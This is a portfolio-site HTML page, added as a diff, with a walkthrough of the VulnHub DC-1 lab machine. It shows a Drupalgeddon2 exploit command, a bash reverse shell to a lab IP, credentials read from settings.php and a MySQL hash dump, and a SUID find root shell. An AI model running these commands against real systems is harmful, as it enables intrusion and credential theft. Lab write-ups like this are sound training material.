@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;800&family=Rajdhani:wght@400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../styles.css">
+    <title>DC-1 | Walkthrough</title>
+</head>
+<body>
+
+<nav class="navbar">
+    <a class="logo" href="../index.html">ROOT ACCESS</a>
+    <ul class="nav-links">
+        <li><a href="../index.html">Home</a></li>
+        <li><a href="../index.html#about">About</a></li>
+        <li><a href="../index.html#resume">Resume</a></li>
+        <li><a href="../index.html#projects">Projects</a></li>
+        <li><a href="../walkthroughs.html">Walkthroughs</a></li>
+    </ul>
+</nav>
+
+<main class="writeup-container">
+    <!-- HERO SECTION -->
+    <div class="writeup-hero">
+        <span class="difficulty-badge">EASY</span>
+        <h1>DC-1</h1>
+        <p class="machine-meta">Linux VM · VulnHub · Drupalgeddon2 · SUID Find · Root in 4 Steps</p>
+        <div class="attack-summary">
+            <p>DC-1 is a Drupal 7 machine that looks complicated but has a stupid-simple path to root. After initial RCE, the fastest route wasn't cracking database hashes or messing with CMS configs - it was a five-second SUID binary check. Sometimes the easiest win is right in front of you.</p>
+        </div>
+    </div>
+
+    <!-- EXECUTIVE ABSTRACT -->
+    <div class="executive-abstract">
+        <h2>🎯 Executive Abstract</h2>
+        <p><strong>The Problem:</strong> Outdated CMS installations are a known risk. But the bigger problem? Once you have a foothold, misconfigured SUID binaries can hand you root in seconds. DC-1 demonstrates both the danger of unpatched software AND the importance of basic privilege escalation checks.</p>
+        
+        <p><strong>The Attack Chain (What Actually Happened):</strong><br>
+        Drupalgeddon2 RCE → www-data shell → Found flag1.txt → Checked SUID binaries → /usr/bin/find had SUID → find . -exec /bin/sh -p → Root in 30 seconds after shell.</p>
+        
+        <p><strong>The Rabbit Holes I Avoided (Or Briefly Fell Into):</strong><br>
+        - Cracking Drupal password hashes from the database<br>
+        - Resetting admin password via MySQL<br>
+        - Logging into the CMS to find "hidden" flags<br>
+        - Kernel exploits for an outdated system</p>
+        
+        <p><strong>Why This Matters for Your Business:</strong><br>
+        The fastest path to root wasn't complicated - it was basic enumeration. Most breaches don't use zero-days. They use misconfigurations like a SUID find binary. Fixing these takes minutes. Finding them takes a pentester who knows where to look.</p>
+        
+        <p><strong>Time to Root:</strong> ~15 minutes after initial shell.</p>
+    </div>
+
+    <!-- VISUAL TIMELINE -->
+    <div class="timeline">
+        <div class="step">1. Recon</div>
+        <div class="step">2. Drupal RCE</div>
+        <div class="step">3. SUID Check</div>
+        <div class="step">4. Root</div>
+    </div>
+
+    <!-- PHASE 1: RECON -->
+    <section class="phase">
+        <h2>🔍 Phase 1: Reconnaissance</h2>
+        <p>Initial Nmap scan revealed three open ports:</p>
+        <pre><code>nmap -sC -sV 192.168.56.107</code></pre>
+        
+        <div class="image-card">
+            <img src="../Imgs/dc1/nmap-scan.png" alt="Nmap scan showing ports 22, 80, 111">
+            <p>Figure 1: Open ports - SSH, HTTP, RPCBind.</p>
+        </div>
+
+        <p>With HTTP on 80, web enumeration was the obvious starting point. The site revealed itself as <strong>Drupal 7</strong> - a CMS with a well-known critical vulnerability.</p>
+    </section>
+
+    <!-- PHASE 2: INITIAL FOOTHOLD -->
+    <section class="phase">
+        <h2>💥 Phase 2: Initial Foothold - Drupalgeddon2</h2>
+        <p>Drupal 7 &lt;= 7.57 is vulnerable to CVE-2018-7600 (Drupalgeddon2), an unauthenticated RCE. A public exploit was used to gain command execution:</p>
+        
+        <pre><code>python3 drupa7-CVE-2018-7600.py -c "id" http://192.168.56.107</code></pre>
+        
+        <p>Output:</p>
+        <pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
+        
+        <div class="image-card">
+            <img src="../Imgs/dc1/drupalgeddon2-rce.png" alt="Drupalgeddon2 exploit returning id command output">
+            <p>Figure 2: Unauthenticated RCE as www-data.</p>
+        </div>
+
+        <p>A reverse shell was established to get proper interaction:</p>
+        <pre><code>python3 drupa7-CVE-2018-7600.py -c "bash -c 'bash -i >& /dev/tcp/192.168.56.1/4444 0>&1'" http://192.168.56.107</code></pre>
+        
+        <p>With a netcat listener running, the shell connected successfully.</p>
+        
+        <div class="image-card">
+            <img src="../Imgs/dc1/reverse-shell.png" alt="Reverse shell as www-data">
+            <p>Figure 3: Reverse shell established.</p>
+        </div>
+    </section>
+
+    <!-- PHASE 3: THE STRUGGLE (Rabbit Holes) -->
+    <section class="phase">
+        <h2>🔍 Phase 3: The Rabbit Holes (What Didn't Work)</h2>
+        
+        <p>At this point, I had a shell as <code>www-data</code>. The next step should be privilege escalation, but I got distracted by shiny objects.</p>
+        
+        <h3>Rabbit Hole #1: The Flags in /var/www</h3>
+        <p>Found <code>flag1.txt</code> immediately:</p>
+        <pre><code>cat /var/www/flag1.txt</code></pre>
+        <p>Cool, but not root.</p>
+        
+        <h3>Rabbit Hole #2: Database Credentials</h3>
+        <p>Found <code>settings.php</code> with MySQL creds:</p>
+        <pre><code>cat /var/www/sites/default/settings.php | grep -E "database|username|password"
+'database' => 'drupaldb',
+'username' => 'dbuser',
+'password' => 'R0ck3t',</code></pre>
+        
+        <div class="image-card">
+            <img src="../Imgs/dc1/settings-php-creds.png" alt="Database credentials exposed">
+            <p>Figure 4: MySQL credentials in settings.php.</p>
+        </div>
+        
+        <h3>Rabbit Hole #3: MySQL & Password Cracking</h3>
+        <p>Dumped the admin hash:</p>
+        <pre><code>mysql -u dbuser -pR0ck3t -e 'SELECT name, pass FROM drupaldb.users;'</code></pre>
+        <p>Got the hash. Started John the Ripper. Watched it run. Got impatient.</p>
+        
+        <div class="image-card">
+            <img src="../Imgs/dc1/drupal-hashes.png" alt="Drupal password hashes from database">
+            <p>Figure 5: Admin password hash - could crack, but there's a faster way.</p>
+        </div>
+        
+        <p><strong>I spent time on these paths. None of them led to root.</strong></p>
+        
+        <p class="note" style="color: var(--gold); border-left: 3px solid var(--gold); padding-left: 1rem;">The lesson? It's easy to get distracted by interesting data. Always default back to the basics: enumeration, SUID, sudo, cron.</p>
+    </section>
+
+     <!-- PHASE 4: PRIVILEGE ESCALATION -->
+    <section class="phase">
+        <h2>👑 Phase 4: Privilege Escalation</h2>
+        
+        <p>With a reverse shell as <code>www-data</code>, the first step was basic system enumeration to identify privilege escalation vectors.</p>
+        
+        <h3>SUID Binary Discovery</h3>
+        <p>The following command was run to find all SUID binaries:</p>
+        <pre><code>find / -perm -4000 -type f 2>/dev/null</code></pre>
+        
+        <p>Among the results, one stood out:</p>
+        <pre><code>/usr/bin/find</code></pre>
+        
+        <div class="image-card">
+            <img src="../Imgs/dc1/suid-find.png" alt="SUID find binary discovered">
+            <p>Figure 6: /usr/bin/find with SUID bit set.</p>
+        </div>
+        
+        <p><strong>/usr/bin/find</strong> with SUID means any command executed through <code>find</code> runs with root privileges. This is a well-documented privilege escalation vector.</p>
+        
+        <h3>Root Shell (One Command)</h3>
+        <p>The <code>-exec</code> parameter allows arbitrary command execution:</p>
+        <pre><code>find . -exec /bin/sh -p \; -quit</code></pre>
+        
+        <div class="image-card">
+            <img src="../Imgs/dc1/find-privesc.png" alt="SUID find privesc to root">
+            <p>Figure 7: Root shell obtained.</p>
+        </div>
+        
+        <p>Verification:</p>
+        <pre><code>whoami
+root
+        
+id
+uid=0(root) gid=0(root) groups=0(root)</code></pre>
+        
+        <p><strong>That's it.</strong> No hash cracking. No kernel exploits. No complicated paths. Just a misconfigured SUID binary that handed over root in seconds.</p>
+    </section>
+
+    <!-- PHASE 5: FLAGS -->
+    <section class="phase">
+        <h2>🏁 Phase 5: Flags Captured</h2>
+        
+        <p>With root access, finding all flags was straightforward:</p>
+        
+        <pre><code>find / -name "flag*.txt" 2>/dev/null
+/root/flag1.txt
+/root/flag3.txt
+/home/flag2/flag2.txt
+/home/flag4/flag4.txt</code></pre>
+        
+        <div class="image-card">
+            <img src="../Imgs/dc1/root-flag.png" alt="All flags captured">
+            <p>Figure 8: All flags obtained - machine compromised.</p>
+        </div>
+        
+        <p><strong>Total time from initial shell to root:</strong> ~2 minutes.</p>
+    </section>
+
+    <!-- CONCLUSION & TAKEAWAYS -->
+    <section class="phase conclusion">
+        <h2>📌 Key Takeaways</h2>
+        <ul>
+            <li><strong>Always check SUID binaries first.</strong> It takes 30 seconds and can be the difference between a 2-minute root and a 2-hour rabbit hole.</li>
+            <li><strong>/usr/bin/find with SUID is an instant win.</strong> GTFObins lists this for a reason. Know your common escalation paths.</li>
+            <li><strong>Drupalgeddon2 is still effective.</strong> Unpatched CMS installations are low-hanging fruit. Patch or get pwned.</li>
+            <li><strong>The simplest path is often the best path.</strong> Don't overcomplicate. Enumerate, identify, execute.</li>
+        </ul>
+        
+        <div class="executive-abstract" style="margin-top: 1.5rem;">
+            <h3>🎯 For the Hiring Manager</h3>
+            <p>This box demonstrates:</p>
+            <ul>
+                <li><strong>Efficiency:</strong> From initial shell to root in under 2 minutes. I don't waste time on unnecessary detours.</li>
+                <li><strong>Fundamental knowledge:</strong> SUID enumeration is pentesting 101. I know the basics cold.</li>
+                <li><strong>Tool proficiency:</strong> Drupalgeddon2 exploit, reverse shells, find command abuse - all executed without hand-holding.</li>
+            </ul>
+            <p style="margin-top: 1rem;"><strong>Bottom line:</strong> Give me a foothold, and I'll find the fastest path to root.</p>
+        </div>
+        
+        <a href="../walkthroughs.html" class="btn-back">← Back to Walkthroughs</a>
+    </section>
+</main>
+
+<footer>
+    <p>© 2025 ROOT ACCESS | Built for offensive security professionals</p>
+</footer>
+
+</body>
+</html>
